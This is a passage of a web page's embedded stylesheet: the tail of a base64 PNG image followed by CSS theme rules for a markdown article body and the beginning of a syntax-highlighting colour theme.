DCEBz/C2CM8EhNrP13fbkeSh3OJgCAe2N1CWXKsGOc6TOr5U4q8MwYhDtkTda02MyPN+nnGBQEH7A37NHYz5KOZVv08qyjbSseEzKauPnsMj98wc6Ibcj5UUv7M8QWZTE52jEwGOVaD8U1Dw1YNWX0qM8VKyb80L/TrOPYOzH4KBJQTrK8M7+7KZjuM63sHBt17FubGoibCuf+tarWFGUmuwWeT8/vCXo1tZOYeZcazCaez8MwEzzM+HqhqtiJI5twxL1jeGLYk7jmKMF1JOCbg6Qj5nAdRqX7q3BYm8VAmQvW1lfcMc58IT95uIA3q+gftrDHPXUXJWkVEHJme5Bp5UmHsvIZ/O3l8ECE/FWcsItX2hr0ae8O2Wjs+J43QTbOZzGYQ/7Wtxq6eXjRK3r0By4YJ6Ty8EiYSJqcm2eGeV4Pox/ANENJR49RiEdfqcLflUJrEBZqgxYHrBjn2ExFURqKdVETN9YirJxKxR2rbrYeQv5ISmB6IsiDGNfZGWPeMgkzr58xnPaJ5p6XDZPKz4T77wayJ7jGhhXLwanOHTWBgq5n5q6YUwNJ7l3kKcRl7OJ7fF56l1GzvHbSD8dghTPi0wIRfv6XafjJ3ssv0PnZQ7nZx/etwzO1zJ3lHR2OETTw8x0tOx1AN3De0D7YV+63oGthjaJQ5Ur7eVVZjcdGInUyuaT73ZWg3efV8fZs7cc2E777Qi5eunVbghvPPymrt/krKGfcLd8ybYjdxrK6333Z09rjHZkNuLYzz0uIc+xWCZzz8nbHbe4dsY1e/XUOY+nimvtUaSazv4jXhaQasSbmYmpuenGwHZ8TKggSEQm08rMD7ahBOoExcMqXQegjnZ+CEvaEa1ZQUQkt39dj0zDS7krq+ARmpdws/nlNqD9WFbWN7l5u3wr9MyrcXKUsqWy3jTOaoML4DdaQ83YIoT4VYpEXvYQZLmbX5SLohBrgOj186Kc/iKTUPUhq+Rrm5ekOl3TWv1Mr6hqwbY0VOQXwEo+Moq4Z47q5qsU489G944LyJOW4LOLZOKtT/iI6+nGe/0dhuEd4ltj2NmiuCU4hnk5fHIi7+RK4uTEu0e+s7rAiRcw1CYy3OejvcYz+eXeI9MYY9nu3lYZl0KavJJ7Vjibzgjp319rUZE20j7CkJqFr5JQYgQ39f3eQaKpQk0afy8nl4uBzvjUUTRk7k3iebOm0pabDiyFn2XGu3dRME41CGVeBVqSiVnc6hIUpekp1VjHLDSOEcQlui5W/U8C7IKREjv1Gabw3wRwUTvpv7jybPtzHmIPZ49q6KRjuccqBQVCOtGvqXhrCFUUXJzOYSHt7Kw5Ix9H08dSje1o1JyL73IYXpEMmE5CRbw6wuykx2pR+Pd6/J4JpLiJKV6N9OnrcQNfQ0Zem6qQX2MmFXyWTE+DMO0kGx4e08DEjnXbsYuOq7niHB8jdY/wQ8Srm2XCZZUrOakF1CY5EKX0h93Tu/1J4kRdbDMT8MamgZK9xe3uDcvrPe++Y4f61rcZr7B53rN1c5N2ytcV5rCrvHt3T2Og19g+5nH7dvq3bqunr4NOwgK2MHA1jeEDuG7HNuLmtw7qpocl5t6nCPvdTQ7v4N4u3WTqeyu9cZHIo4f6lqdFoHh7wzMbzDeeGv3Hvzjlrnh2W1zofhHuftxpFn3VFe7zxS0+p0DlKVPbhhvBxhvwiFMgfP+mjHA08gEC4pybeLyK1iZldh8zC5VJQyUl8l59KZ0WJk2xaiYWxNrkXXJhA8r3PvZRur7ZZZRfadaRPsfiTmX9HGajC2tXd6V8dQTMhX0h8rNdJx9Ra8F8SbRNLzhPRnJmTZIUTYueTyWxyr7uv3rjC3OkzE8495oS+4xq6D5WoI0bO5WVCOSerl8rIeBrOI/Hkaw6ME5W1zSuzx2la3CRdWi3zIG+FDBvUp9LMgI/vggUmE7KkT81yGvOOgEYa/aUahhRAF5xLec3OzbF1r2O17BbVxIi7hzJIC64IYhXdJA+nh/5xVbOmE9J0QqjSxWk0pp37M2YEtgjS8GpimACu7xkqxdKJ6fEXyYl2Lre0ZtC8yELVewtWUnbfCPIhrvgDFz8WI5yhJKgcnFMZWEFrwhgzo5uWDDDA1oGSOzcu0xfx7vTlsv6posIMpJ6cGWPiw/BxL4PU7vbrpjgf8bMdu5OYwOdhm83DARUSa0ELknYIeEAaILuWxlhGa0M8+EuJCrpJT+ymENhN60pXBxa3LZ5TsucnlGaCmIEQ4Evru91yuz0xMtKaeXluI5zdh9Mm8vAlBn4aR07X64EH3vEKdXQkZJXPP/JxMvNRpLxEtHZ5RQgmNewnpouvVTpYTHdfOnmy5kFUGnpRTfEhXD9DiBdFFJB0/YWS9aj6pmc89r0BaQmgTRkgI+EsdKsYasJZOBF+QqTH474NK7LbyBvf7W+RgOxNyxfQY2/2hrp2+NkroxrzrQ55fSZkpJIa28znCgF6rb7H1hOSslATyvNflAh9pvHcX3lVE/Ya8FjTJIexa2Rq77nfU96unTnD7aME3+TAm6BFKYrPnqCNIqV5sq0ZGCiEV+Db+qWMQqpFgb5KPx48R6omeDl2EuP9DTYt9iGA/f1KBS1w/La+H4ktsSmLItvZHXLUkrCeflVtJ9DVVg1H7+sxiGvVM975rZpfabuqHVhuP5F1vewav5O8GamUe91yDanoYw47FWzC929O+DJnKA2opFY1Rjru5CE7kOcO0jJtQVUIynzuZEMeb+1CEOFXN8iFSGeRpCm1BTlJxVg49Azm819SO7Bu0axEbwn27GuxMck+TMQHDP8fn48gfDVIL4R8xKVPJ73MQBUIfA/Z54LMw5vmlE+w+VFo2A78X/SsyPA/RMD0z3e2qVLtfo7aeBslpMX0N0TEnLcUlKym1jyBFqSohmYntI5enBhYB9CY/2kNarhwJhNiMtRGyWnkQdKaCFyQwgydjyNUw4VchKxXv2/DoKdC+lkQbCX1NlKCGvJiBJkSGbCus6jfo4yGBNySgr+u7e20BCsxdVAcFlJ/tHd32+cIsNxSXUULUUx+dg/d47g7OPYFw2MxkSuyMwLHVTI6PBN6dS8Sppw45zHJSgDXV3aQzmz40Z6fDgBfiAXU0uZxby2zejee+j3eltoQMzhV6qSBogXwrEXDj7ElWxUQ8RrnSaoU0dxIsKaiMvMykXTu90NqJsGHP4z78SdLigUrLKat32nFwy/E07pfDFRdQ/7N5r57pQ1482uvWhMGhQcviGkVrKDUp0ToCxfhQal5n4Hs/g1jOgH4LWdwFOd1b1WzHET4vLZppv+Czjxo840OrDlG8jAJzv2tp5mLK1dsU/lfIOeWy5NxFxfl2BoYImlQtx9QF6mJRQKBsQYYuO2yaLYPBUXvu/VqYPxtHhNy7Y4hCkNLGPtKSklzCVKSHtMQxcqm5Kw1DhI2PTGZtcGDAvoLQ/u7MifYtWFBlxz2H9zo8RkwKzC5UYiG+p44ccqE62YAxLeT/TOpf8MXx8Qk0IJFRY1Go+viQVJpE5Ehjf49xfAZeqGIy/7us3nqxwQfCkjZypPxobVr/6YpQHIalUvuCyEwbSXC9PC8QnkFcXlrgLpoLIhIfKuaqlQkYIAwQnr/f3eyu7KttOw2lNpv8/BPHyjzVNER3o72gvEBKqRMTflndbP8BMweRDyeciEj5bFayFXqTLzheivgYJC0jwzwHa0MDDEotm48ndze5BBBElAnxxcRYHAFh3FfZaA9UNRmC354kNwUx8eHkmVj5dcTE5ZMnuEyr1QqlhtaJLuOYZv4v3KNo0TKrGPUZ1NILPKuWcvVn5Trv10SMB6h0j/ARMnlOuafCBIfnSWEx/Raif3HDzofYMM31dOyY9LBaLK3TjoX2fEqT4+2qaUVWSTQvyM6wC8nNJyEetXIyuLKrx04P7MKNnbJZlKUtNAIHo7i2dA/YU3Vtdi5l6jCepXy8hOedSSSsI8/HQg5Q+gxTKXwkMHkbESo+hjG0lbRRzQ3Fc5LOzDuFhs3Ptumpie7ilRDhlEJOq/hjsZljCxjkt7fWuPS/EekpXMggJQIk0G+eN9Xu2VmHWIkJe0nJRN4ptBBit2yutG9ML7J1DHAxebiAMrZ4VZlduqGS8I2tJc2iborUxmIN79c+kTovFxivPvrcSaP3n7RSKYTUmKt4N3rMOcw4JOneD3sP956jNaMglIeTER5Xbdlt15Tm2W10NEsYrA/N5JLCHHsR9tSqwxq08G3bqm1ZTbOtagnbo6SLvH/VzBL7W7jPzqFea0LmMLFzUuLtdwumuO3i1Vtq7OK15Xgw3l1PDmIXak+6QBEkvB9YJIzBcc/L20JIYaSZ/qAzVm5Ut4oowk3QehC+N3xo/1wTqt7zsYawfX9no9XjqdPXVLhrwyo/wucJYQkE1e4j8rLcBuHUItQQKqgMXb6LGvxFQlXw33AdZLR0V5P9Fr29lP73scNnosoyvdWPv4fPJ+uJrLVtMakqaL1M1cTvv0OLIZE6wk2a2IcIRUQh+DaejpdcXepBa7bKDRGM9PIVxTl2EwarZ72rooVuY4RQtMypdk6e1lLLehhY2lt7QEd7WxlCDvdIli6E9B4+ZIodmZEMccUGqgiZOqru9tkR3iJ8nCcXRWRZCSPMLPEjlx2LjQL1OM5qKAm+vhSuRqSfV5Ttrg8FdWcrnhMqCTex7DEM6qTsVEuM1+8hovaHQ6e6a1Fz0xLd3nUt4ToWWuzWNkhcoAIIjUx2ZpxjLzWF9+SYmngR1lok4TEoJxGfuijhI/7OICoFmadl2llcL9b1oRVJtbD+JLlv1KrhHG5811t9ELbzgk14ICUwqE+TDzftqHPz98vUSy3jSIwP8dCpkNqLDPTx+rArz4T5qLG3G2PrvJKKPoLBWE501NC3ilUX5mVjVIb9nIbgWcpPMiSXjbcL8K62UkR86m1/yfkSeMaHFuK04X0CE3J6SWzFUxw0BSNHlSzi3RmIRJwHq5udO3c16quLp6sbnffbupxbt+12vzOrzuvNHc7ycRbIxuJHgYU7YSASdQgxp7qz2ynv6HJeqW91doa7nLruXof+17sqhhu31Xif9o7HalqczV29Dnrb/f5EXZvzdH27U98/6LR5i3N0UM5zjHU71/lwjRWWltU5CAIn7F1MqLp/r9hQ5RoaxG+qmrxP4yNKcfsFLwuiprffeb2l03m2scO5h3Or2rudzjGrhk8x4Cqu2xcexilBvNEcdi5Yu4tKF3Ue4tzPy+td5/1md4tzw5iJ27NuXEYobYUdlb8z6GTWkdxaCvk2zHjd5mpKQ459mv5TkAp6mQb9Aq9HHQ8S6mrZnuc6vUG6WHusIhCJGNXl9byvnJyaiE7+Eoz8c5TYNQiUveENGpJpcIJ+biS8R0+rlcazGNs7pKB+zPLTOSX2KNWhlDAf4r2Spj72JORB5OyHULX+dlD/FOky/HFy5ygYU0sey/i8moeqdunXK1qC3RuaMOYHlI/raQMl3M+EeTV5WxD3Km8a8PkM8nr648sQ9+esKbf5e/nxiKBfAOQkxbv3SU9LYmqPV9V/Pn+V20VwTyVjTqCI6edEQUOFUXs9WmfSll8DyX2dt7GlnwkswaM3l9XZ0oNK3MTXbxpOV2sGk69s6XCJw4cY8KbyRrt9TrHt7Bm0rRBQe1+fHUWNfaapU0KbqxzbORC1M/LS3dJwIl3KOrwykQG/E+61q+isgniztdOKqNOziDgZqZIzFwPvqGiyg5NCtoCqoG5NxHhPZTOsnORulKskjoKMDeLuXQ3OmnC3syxARFXdfc57LR3OrdtrvSOOs55rnqhtcdoGhpxHdjc5EfJUuHZTlftX+G15rXPlhkrnLe59F7Lz8VGHdg8c5y2OLeMZ126qduq9XC3v7nd+FchLvYPJd15gPCu8XQnh/qpm59WGVudZzvvQO97kXTcGxhnEuJvR39tWY8cwK4uhcikk4a3Gdstg9l5B2t0wfaTdWkEou5vCPOV5PH73vFL3+DfXltnh6OxjkJD6Wd5F3g88tMe6CW/7YmI99VIL4u0oqUK8ocW4d8hFrXMVoOQU8s3U97MnjvDD/XRYkyhHM1MT3GVZQR2Tdv70U8EbA5vlo+CaPAaaSWoZXm50otGodxQ6L6txGKxzw5ZYORrBsPPrykZKQIy1n8bTjwb2fO4Te3ue7x6KOKvaYns1wtIddd4nx3mwot55qyl2360cp81zurg+CGqwU8v4/Of5uAVvPgObrwvHomY8jOtZ4fXWLnefdHVXv9044+8ZklCx75DXwcV1Sb27y+vInUQEuVYSaMgRJYfAwtoj0raFxIUW1A8nz35f02qLc9Lc9lG7CBkwtUR7bf+A+5uL6ehnH9Lat+5sIEfj3Cbj3NKRvP7Rjlo7FSmqavKvpSP8MRZ7NVbQYLSkqlC9ZW4sPH18gBTcORjrhMWmQWzFmK2UsvO90qQ1oZcI8UhkCLZPtRqMy0NirobAvjIpb4/sW06qKGyPR2oGIdlazjOOTk+kLYzaaYGSp63Wz6HsXsQ51wd+LTAuZOy+8GBNq7tF+IOdDU4kENJthNID5YRafZtzZ3mDs9LbRgzixcZ2l1h83OKFbDmEd0/FiFp7DWHgp0AQGzq6nf8hPF+oa3EehOz0ziCWcm4NpBRMhX1hn571oR9wqVVSDVPtUi32sQ0vbu7scZdY9aOt2ZSEL9BEBIW+dv20AKDd9/ep09oimYqHpyImkKDuRllS4PrlHNuIqDmCJmNJQba7q1joEaUQJuR/WdXsLrJrq/L6cdJsPOyXscJ7GLKqo8cOpqhrO//yQG6oS3kZwS9xPkRB3wi7diFMtDN+PLk5m1ath+8f0Fy80dbjhvVXub+U5mEqeal27UP+dWpPlknNxW79Ak6/7Tg3UMOF52j1xA1qK7Trd6nXC+8P9ttYQcumIonLSnJtBdJNa77axw1C2x3qR4Wqnj73x9f6MbV+CCYFBZO6y51aSh3gzVrsmwzJnULEbCJC1oZ7vIZ/9Iqmfvn2u5oWO5n8fApxcuWUApum5diPgY9lrA9EtvUNOzYf8vqAcJPsU5iOh7XtXQgt2uZhjKU2amF7HQyfEYWcZk5yQ1RDKNrLcq02k/9IGmldrB93KiokPw8EB2SsoKWXO5FmxXhlckqi+3vEUvLqwok5PHVkIWAszlqzy1p54zuLpnPZ3q9bod08JlLSb5DrNxDm38Sbvsg5EBywsT7oH+3XNW3uasGirFSrxRNdCllKiPZHZzJYLZb5qEcpae3pxMCuu9oibS5/QCOiLcYUrp+MmtJeURjFdVlxzqiae6D4h40NQt54HyGv3JRo10aVfv8YhtC0pSlVKcPFuxIXahr08mzCO4VzMlLSsZuomZ+RaucU0rXsw/sfF5+osUFonWob/7TrLdaUgdpV93fl9X+VIC0Y6tek2uI8OD3J5gT2Vj9ZmP0f4IM4iY7RQ5gAAAAASUVORK5CYII=) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class 